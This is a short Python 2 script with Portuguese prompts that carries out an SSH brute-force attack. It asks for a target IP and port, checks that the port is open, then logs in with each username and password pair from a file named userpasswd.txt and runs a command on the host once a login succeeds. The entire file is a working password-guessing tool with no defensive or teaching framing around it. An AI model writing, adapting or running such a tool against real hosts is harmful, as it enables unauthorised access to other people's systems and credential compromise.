import paramiko, sys, os, socket

arquivo = "userpasswd.txt"
mensagem = " echo '--- Conexao SSH realizada com sucesso!'"
i =1
portaAberta = 0

endereco = raw_input(">>> IP: ")
porta = 22
print "\nPorta padrao: 22"
print "S | N"
resposta = raw_input(">>> Deseja informar a porta: ")
resposta = resposta.strip().lower()
if resposta == "s":
    porta = input(">>> Porta: ")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
resultado = sock.connect_ex((endereco, porta))

if resultado == 0:

    print "\nA porta",porta,"esta aberta\n"
    print "S | N"
    resposta = raw_input(">>> Deseja realizar o ataque de forca bruta? ")
    resposta = resposta.strip().lower()
    if resposta == "s":

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_stdin = ssh_stdout = ssh_stderr = None
        file = open(arquivo, "r")
        for line in file:
            try:
                usuario = line.split(",")[0].strip()
                senha = line.split(",")[1].strip()

                print "\n---",i,"Tentativa - Usuario:",usuario,"e Senha:",senha
                ssh.connect(endereco, username=usuario, password=senha)
                if ssh:
                    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(mensagem)
                    break
            except Exception as e:

                print "--- Erro na conexao SSH!\n"

        if ssh_stdout:
            sys.stdout.write(ssh_stdout.read())
        if ssh_stderr:
            sys.stderr.write(ssh_stderr.read())
    else:
        print "Saindo...\n"
        sys.exit(4)
else:
    print "--- A porta",porta,"nao esta aberta"
